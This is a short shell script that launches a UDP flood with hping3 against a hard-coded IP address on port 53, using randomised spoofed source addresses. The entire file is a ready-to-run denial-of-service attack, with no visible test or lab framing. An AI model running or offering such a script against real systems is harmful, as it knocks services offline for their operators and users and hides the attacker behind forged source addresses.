#!/bin/sh

IP=20.79.0.2
PORT=53
echo "Running UDP Flood on $IP:$PORT..."

hping3 --udp --flood -V --rand-source $IP -p $PORT